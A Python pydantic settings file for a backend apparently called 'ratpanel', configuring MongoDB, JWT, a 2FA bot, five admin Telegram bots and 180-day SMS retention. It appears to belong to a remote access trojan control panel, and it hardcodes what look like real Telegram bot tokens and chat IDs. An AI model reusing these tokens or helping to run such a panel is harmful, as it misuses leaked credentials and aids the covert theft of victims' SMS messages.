from pydantic_settings import BaseSettings
from pydantic import ConfigDict, field_validator
from typing import Optional, List, Dict, Any
import json

class Settings(BaseSettings):

    MONGODB_URL: str = "mongodb://localhost:27017"
    MONGODB_DB_NAME: str = "ratpanel"

    SERVER_HOST: str = "0.0.0.0"
    SERVER_PORT: int = 8765
    DEBUG: bool = True

    SECRET_KEY: str = "your-secret-key-change-in-production"
    JWT_ALGORITHM: str = "HS256"
    ACCESS_TOKEN_EXPIRE_MINUTES: int = 1440

    TELEGRAM_2FA_BOT_TOKEN: Optional[str] = "8579213664:AAFOMI_7RXQEyiBzSFoYJrIiKgukIGSnbv0"
    TELEGRAM_2FA_CHAT_ID: Optional[str] = "5866597775"
    
    TELEGRAM_ENABLED: bool = True
    
    ADMIN_BOT1_TOKEN: Optional[str] = "8012277816:AAEO7WvetFhJv9FP7E-JSi-i38TyiYucsNY"
    ADMIN_BOT1_CHAT_ID: str = "-1002619104440"
    ADMIN_BOT2_TOKEN: Optional[str] = "8348723871:AAHiw3LWbKJpjgGMgooZLGwOAHPbnIIyLKI"
    ADMIN_BOT2_CHAT_ID: str = "-1003281785728"
    ADMIN_BOT3_TOKEN: Optional[str] = "8566007628:AAEQCBPHEMjHkLlbM3TjooX-cbMt5Gs4UpI"
    ADMIN_BOT3_CHAT_ID: str = "-1003234381315"
    ADMIN_BOT4_TOKEN: Optional[str] = "8483775633:AAG49mPub-23eWPtcAV7qNH-6K0mWCasbn8"
    ADMIN_BOT4_CHAT_ID: str = "-1003225189407"
    ADMIN_BOT5_TOKEN: Optional[str] = "8590685447:AAHtKe6Bf4R5F6Dmrorn_vbnvOInpN3e-EY"
    ADMIN_BOT5_CHAT_ID: str = "-1003258979582"
    
    TELEGRAM_BOTS: List[Dict[str, Any]] = []
    
    @field_validator('TELEGRAM_BOTS', mode='before')
    @classmethod
    def parse_telegram_bots(cls, v):
        
        if isinstance(v, str):
            try:
                return json.loads(v) if v else []
            except:
                return []
        return v or []

    PING_INTERVAL: int = 30
    CONNECTION_TIMEOUT: int = 60
    MAX_MESSAGE_SIZE: int = 10 * 1024 * 1024

    SMS_RETENTION_DAYS: int = 180
    LOGS_RETENTION_DAYS: int = 30
    ADMIN_ACTIVITY_RETENTION_DAYS: int = 90

    model_config = ConfigDict(
        env_file=".env",
        case_sensitive=True,
        extra='ignore'
    )

settings = Settings()
